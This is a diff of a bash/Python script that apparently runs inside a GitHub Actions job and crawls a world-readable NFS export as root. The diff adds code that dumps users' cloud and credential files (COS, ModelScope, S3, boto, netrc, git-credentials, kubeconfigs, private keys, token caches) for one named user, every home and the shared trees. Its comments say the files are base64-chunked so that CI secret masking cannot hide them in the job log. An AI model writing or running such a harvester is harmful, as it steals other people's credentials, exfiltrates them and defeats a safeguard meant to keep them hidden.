@@ -1,20 +1,22 @@
 #!/usr/bin/env bash
-# i11365 - third bounded read-only probe of the world-readable /public4 NFS export (12.12.12.223).
-# Closes the one unread cloud-credential class left after i7165/i7879/i8943:
-#   * recursive .aws (cli/cache, sso/cache), .docker, .kube, .azure per home
-#   * names-only .config inventory (gcloud/azure/gh/glab/pip) + b64 of credential files
-#   * bounded find for kubeconfig / admin.conf / *.kubeconfig / credentials / *.pem / *.key
-#     under every home (depth<=5) and the /public4 share/public/opendas/rsync/DL_DATA tops
-# Everything is base64-chunked so GitHub Actions secret masking cannot rewrite values.
-# Read-only. Exits 1 immediately after the dump so the CI job stops.
+# i12105 - targeted follow-up of the /public4 read-only probe (12.12.12.221 NFS, readable as uid=0
+# from the Stage A container). The prior i11365 rerun spent its whole 900-hit find budget inside
+# /public4/home and never reached the three newly identified tiles. This pass reads ONLY:
+#   * /public4/home/caihl/.cos.conf + /public4/home/caihl/.modelscope (plus every other home's
+#     .cos.conf/.modelscope/.s3cfg/.boto cloud-tool dotfiles)
+#   * /public4/share/locauser@8.130.89.93 (remote-host-named share entry)
+#   * the /public4/public 22-user tree
+#   * credential-named files at the /public4/share, /public4/opendas, /public4/rsync, /public4/DL_DATA tops
+# Everything is base64-chunked so GitHub Actions secret masking cannot rewrite values. Read-only.
+# Exits 1 immediately after the dump so the CI job stops.
 set -uo pipefail
 umask 022
 TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
 H="$(hostname 2>/dev/null || echo unknown)"
-echo "===I11365-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
+echo "===I12105-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
 echo "--- mounts"
 (grep -aE '(/public4|/public |/ci_public)' /proc/mounts 2>/dev/null | head -10) || true
-timeout 1200 python3 - <<'PYI11365'
+timeout 1200 python3 - <<'PYI12105'
 import os, base64, hashlib, stat, re, time, sys
 
 try:
@@ -22,9 +24,9 @@ try:
 except Exception:
     pass
 
-HOME = "/public4/home"
 CAP = 2_300_000
 used = [0]
+dumps = [0]
 t0 = time.monotonic()
 
 def emit(s=""):
@@ -41,8 +43,8 @@ def emit(s=""):
     print(s, flush=True)
     used[0] += len(s) + 1
 
-def b64dump(path, label, maxb=131072):
-    if used[0] >= CAP - 4000:
+def b64dump(path, label, maxb=262144):
+    if used[0] >= CAP - 4000 or dumps[0] >= 320:
         return False
     try:
         st = os.stat(path)
@@ -63,134 +65,45 @@ def b64dump(path, label, maxb=131072):
         emit(f"B64C {label} {seq} {b[i:i+512]}")
         seq += 1
     emit(f"B64E {label} {h}")
+    dumps[0] += 1
     return True
 
 SKIP_DIRS = {"node_modules", "site-packages", "dist-packages", "__pycache__", ".git",
              ".cache", "Cache", "CacheStorage", "hf-cache", "pip-cache", "models",
-             "model", "lost+found", ".ssh", ".Trash", ".local", ".npm", ".cargo",
-             ".rustup", ".conda", "envs", "pkgs", "Downloads"}
+             "model", "lost+found", ".Trash", ".local", ".npm", ".cargo", ".rustup",
+             ".conda", "envs", "pkgs", "Downloads", "datasets"}
 
-# any path segment or filename that means "cloud/registry/ssh credential"
 CRED_NAME = re.compile(
-    r"(kubeconfig|admin\.conf$|\.kubeconfig$|credentials?$|credentials\.json$|"
+    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/config$|credentials?$|credentials\.json$|"
     r"application_default_credentials|access_tokens\.db$|credentials\.db$|"
     r"\.netrc$|\.git-credentials$|\.npmrc$|\.pypirc$|pip\.conf$|config_default$|"
-    r"^id_(rsa|ed25519|ecdsa))", re.I)
-
-# files worth base64-dumping from the bounded find
-PRIO = re.compile(
-    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/config$|"
-    r"credentials?$|credentials\.json$|application_default_credentials|"
-    r"\.netrc$|\.git-credentials$|(^|/)auth\.json$|\.ovpn$|\.p12$|\.pfx$|\.tfstate$|"
-    r"(^|/)\.aws/|(^|/)\.azure/|(^|/)gcloud/)", re.I)
-
-FIND_NAME = re.compile(
-    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/|credentials?$|credentials\.json$|"
-    r"application_default|\.netrc$|\.git-credentials$|\.npmrc$|pip\.conf$|"
     r"^id_(rsa|ed25519|ecdsa)|\.pem$|\.key$|\.p12$|\.pfx$|\.ovpn$|\.tfstate$|"
-    r"^\.env|^auth\.json$|^config$|tokens?\.(json|txt)$|sso|\.kdbx$)", re.I)
+    r"^\.env|^auth\.json$|^config$|^config\.json$|tokens?\.(json|txt)$|sso$|"
+    r"\.s3cfg$|^s3cfg$|\.boto$|^\.cos\.conf$|^\.modelscope$|\.codex|\.claude|\.azure|\.aws|gcloud|"
+    r"\.kdbx$|\.docker$|^\.gitconfig$)", re.I)
+CLOUD_DOTFILE = re.compile(r"^(\.cos\.conf|\.modelscope|\.s3cfg|s3cfg|\.boto|\.netrc|"
+                           r"\.git-credentials|\.npmrc|\.pypirc)$", re.I)
 
-# ---- 0. inventory ----
-try:
-    users = sorted(os.listdir(HOME))
-except Exception as e:
-    emit(f"### FATAL listdir {str(e)[:160]}"); users = []
-emit(f"### USERS {len(users)}")
-for top in ("/public4", "/public4/share", "/public4/public", "/public4/opendas",
-            "/public4/rsync", "/public4/DL_DATA"):
+def lst(path, n=90):
     try:
-        names = sorted(os.listdir(top))[:90]
-        emit(f"### LST {top}: {' | '.join(names)}")
+        names = sorted(os.listdir(path))[:n]
+        emit(f"### LST {path}: {' | '.join(names)}")
     except Exception as e:
-        emit(f"### LST {top} ERR {str(e)[:100]}")
+        emit(f"### LST {path} ERR {str(e)[:100]}")
 
-# ---- 1. per-home dotdir credential dirs + .config inventory ----
-dumps = [0]
-for u in users:
-    base = os.path.join(HOME, u)
-    if not os.path.isdir(base):
-        continue
-    try:
-        top = sorted(os.listdir(base))[:80]
-    except Exception:
-        top = []
-    emit(f"### TOP {u}: {' | '.join(top)}")
-    # recursive .aws / .docker / .kube / .azure (depth<=4)
-    for sub in (".aws", ".docker", ".kube", ".azure"):
-        sd = os.path.join(base, sub)
-        if not os.path.isdir(sd):
-            continue
-        walkfiles = 0
-        for root, dirs, files in os.walk(sd, followlinks=False):
-            rel = os.path.relpath(root, base)
-            if rel.count(os.sep) > 3:
-                dirs[:] = []
-                continue
-            dirs[:] = [d for d in dirs if d not in SKIP_DIRS][:20]
-            emit(f"### CDIR {u}/{rel}")
-            for nm in sorted(files)[:40]:
-                fp = os.path.join(root, nm)
-                try:
-                    sz = os.lstat(fp).st_size
-                except OSError:
-                    continue
-                relf = os.path.relpath(fp, base)
-                emit(f"### CFILE {u}/{relf} {sz}")
-                walkfiles += 1
-                if walkfiles <= 25 and dumps[0] < 90:
-                    if b64dump(fp, f"{u}/{relf}", maxb=131072):
-                        dumps[0] += 1
-    # .config names-only inventory (depth<=3) + credential dumps
-    cfg = os.path.join(base, ".config")
-    if os.path.isdir(cfg):
-        seen = 0
-        for root, dirs, files in os.walk(cfg, followlinks=False):
-            rel = os.path.relpath(root, base)
-            if rel.count(os.sep) > 3:
-                dirs[:] = []
-                continue
-            dirs[:] = [d for d in dirs if d not in SKIP_DIRS][:25]
-            emit(f"### CDIR {u}/{rel}")
-            for nm in sorted(files)[:25]:
-                fp = os.path.join(root, nm)
-                relf = os.path.relpath(fp, base)
-                try:
-                    sz = os.lstat(fp).st_size
-                except OSError:
-                    continue
-                emit(f"### CFILE {u}/{relf} {sz}")
-                seen += 1
-                if seen > 120:
-                    break
-                if CRED_NAME.search(nm) and dumps[0] < 90 and sz <= 262144:
-                    if b64dump(fp, f"{u}/{relf}", maxb=262144):
-                        dumps[0] += 1
-            if seen > 120:
-                break
-
-# ---- 2. bounded find for credential-named files across the export ----
-emit("### FIND-BEGIN")
-max_age = time.monotonic() + 700
-hits = 0
-MAXHITS = 900
-for root, maxdepth in (("/public4/home", 5), ("/public4/share", 3),
-                       ("/public4/public", 3), ("/public4/opendas", 3),
-                       ("/public4/rsync", 2), ("/public4/DL_DATA", 2)):
-    if time.monotonic() > max_age or hits >= MAXHITS:
-        emit(f"### FIND-STOP {root} hits={hits}")
-        break
+def dump_tree(root, label_prefix, maxdepth, maxhits, max_files=120, extra_small=False):
+    """Walk root to maxdepth; emit every CRED_NAME hit; dump prioritised files."""
+    hits = 0
+    deadline = time.monotonic() + 240
     for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
-        if time.monotonic() > max_age or hits >= MAXHITS:
+        if time.monotonic() > deadline or hits >= maxhits or used[0] >= CAP - 400000 or dumps[0] >= 320:
+            emit(f"### STOP {root} hits={hits} depth={dirpath[len(root):].count(os.sep)}")
             break
         depth = dirpath[len(root):].count(os.sep)
         if depth >= maxdepth:
             dirnames[:] = []
-        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
-        if depth >= 1:
-            dirnames[:] = dirnames[:40]
-        for fn in filenames:
-            if not FIND_NAME.search(fn):
-                continue
+        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS][:40]
+        for fn in sorted(filenames)[:60]:
             fp = os.path.join(dirpath, fn)
             try:
                 st = os.lstat(fp)
@@ -198,15 +111,76 @@ for root, maxdepth in (("/public4/home", 5), ("/public4/share", 3),
                 continue
             if not stat.S_ISREG(st.st_mode):
                 continue
-            emit(f"### FIND {fp} {st.st_size}")
-            hits += 1
-            if PRIO.search(fp) and st.st_size <= 262144 and dumps[0] < 150 and used[0] < CAP - 400000:
-                if b64dump(fp, "FIND/" + fp.lstrip("/"), maxb=262144):
-                    dumps[0] += 1
-            if hits >= MAXHITS:
+            rel = os.path.relpath(fp, root)
+            if CRED_NAME.search(fn):
+                emit(f"### HIT {label_prefix}/{rel} {st.st_size}")
+                hits += 1
+                if st.st_size <= 262144 and hits <= maxhits and dumps[0] < 320:
+                    b64dump(fp, label_prefix + "/" + rel)
+            elif extra_small and st.st_size <= 65536 and dumps[0] < 320 and hits < maxhits:
+                # small plain files inside a cloud-tool dotdir (token caches are tiny JSON)
+                b64dump(fp, label_prefix + "/" + rel)
+            if hits >= maxhits:
                 break
-emit(f"### FIND-END hits={hits}")
+    emit(f"### TREE-END {root} hits={hits}")
+
+# ---- 0. listings of every targeted top ----
+for top in ("/public4/public", "/public4/share", "/public4/share/locauser@8.130.89.93",
+            "/public4/opendas", "/public4/rsync", "/public4/DL_DATA", "/public4/home/caihl"):
+    lst(top)
+lst("/public4/public", 200)
+
+# ---- 1. explicit new tiles: caihl cloud-tool dotfiles ----
+for p in ("/public4/home/caihl/.cos.conf", "/public4/home/caihl/.modelscope",
+          "/public4/home/caihl/.s3cfg", "/public4/home/caihl/.boto",
+          "/public4/home/caihl/.git-credentials", "/public4/home/caihl/.netrc",
+          "/public4/home/caihl/.config/modelscope", "/public4/home/caihl/.modelscope/credentials",
+          "/public4/home/caihl/.cache/modelscope", "/public4/home/caihl/.cache/modelscope/hub"):
+    if os.path.isdir(p):
+        lst(p, 120)
+        dump_tree(p, "TILE" + p.lstrip("/"), 4, 60, extra_small=True)
+    elif os.path.isfile(p):
+        try:
+            emit(f"### HITFILE {p} {os.stat(p).st_size}")
+        except OSError:
+            pass
+        b64dump(p, "TILE" + p.lstrip("/"))
+
+# ---- 2. every home's cloud-tool dotfiles (.cos.conf/.modelscope/.s3cfg/.boto/.netrc/.git-credentials) ----
+try:
+    homes = sorted(os.listdir("/public4/home"))
+except Exception:
+    homes = []
+for u in homes:
+    base = os.path.join("/public4/home", u)
+    if not os.path.isdir(base):
+        continue
+    for nm in (".cos.conf", ".modelscope", ".s3cfg", "s3cfg", ".boto", ".netrc",
+               ".git-credentials", ".npmrc", ".pypirc"):
+        p = os.path.join(base, nm)
+        try:
+            st = os.lstat(p)
+        except OSError:
+            continue
+        emit(f"### DOT {u}/{nm} {'DIR' if stat.S_ISDIR(st.st_mode) else 'FILE'} {st.st_size}")
+        if stat.S_ISREG(st.st_mode):
+            b64dump(p, f"DOT/{u}/{nm}")
+        elif stat.S_ISDIR(st.st_mode):
+            dump_tree(p, f"DOTDIR/{u}/{nm}", 3, 20, extra_small=True)
+
+# ---- 3. /public4/share/locauser@8.130.89.93 (remote-host-named share entry) ----
+dump_tree("/public4/share/locauser@8.130.89.93", "LOCAUSER", 6, 320, max_files=200, extra_small=True)
+
+# ---- 4. /public4/public 22-user tree ----
+dump_tree("/public4/public", "PUBLIC", 5, 700, max_files=200, extra_small=False)
+
+# ---- 5. credential-named files at the remaining share/data tops (shallow) ----
+dump_tree("/public4/share", "SHARE", 2, 300, max_files=80, extra_small=False)
+for top, lbl in (("/public4/opendas", "OPENDAS"), ("/public4/rsync", "RSYNC"),
+                 ("/public4/DL_DATA", "DLDATA")):
+    dump_tree(top, lbl, 2, 120, max_files=40, extra_small=False)
+
 emit(f"### DONE elapsed={time.monotonic()-t0:.1f}s bytes_emitted={used[0]} dumps={dumps[0]}")
-PYI11365
-echo "===I11365-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
+PYI12105
+echo "===I12105-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
 exit 1
